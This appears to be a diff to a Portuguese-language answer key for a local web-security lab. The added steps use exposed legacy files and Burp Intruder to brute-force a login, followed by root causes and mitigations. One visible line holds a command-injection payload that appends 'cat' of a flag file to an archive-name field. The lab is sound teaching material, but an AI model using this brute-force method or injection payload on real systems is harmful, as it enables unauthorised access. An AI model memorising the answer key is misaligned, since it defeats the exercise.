@@ -6,6 +6,51 @@ Gabarito tecnico completo. Use apenas no ambiente local autorizado:
 http://127.0.0.1:8090
 ```
 
+## 0. Descoberta pre-login
+
+Fluxo tecnico:
+
+1. `GET /robots.txt`
+2. `GET /old/deployment-notes.txt`
+3. Usuario encontrado: `analyst`
+4. Senha antiga incorreta: `analyst2022`
+5. `GET /backup/readme.txt`
+6. `GET /backup/password-candidates.txt`
+
+Burp Intruder:
+
+1. Capture um `POST /api/auth/login`.
+2. Mantenha `username` fixo como `analyst`.
+3. Marque somente o valor de `password` como posicao.
+4. Carregue os candidatos de `password-candidates.txt`.
+5. Identifique a resposta `200`, com tamanho diferente e mensagem `Login successful`.
+
+Credencial final:
+
+```text
+analyst:analyst123
+```
+
+Causa raiz:
+
+- information disclosure pre-auth;
+- arquivos legados publicados no webroot;
+- backup publico com lista de senhas candidatas;
+- `robots.txt` nao e controle de acesso;
+- notas antigas mantidas em producao;
+- falta de rotacao adequada.
+
+Mitigacao:
+
+- remover arquivos sensiveis do webroot;
+- nunca publicar listas de senhas;
+- usar secrets manager;
+- rotacionar credenciais expostas;
+- revisar artefatos publicos antes de deploy;
+- monitorar arquivos estaticos expostos;
+- nao confiar em `robots.txt` como protecao;
+- implementar rate limiting e lockout em login real.
+
 ## Payloads principais
 
 ```text
@@ -21,7 +66,7 @@ archiveName: backup.tar.gz; cat /app/flags/root.txt
 
 ## Login
 
-Credenciais:
+Login com a credencial descoberta na etapa pre-login:
 
 ```text
 analyst:analyst123
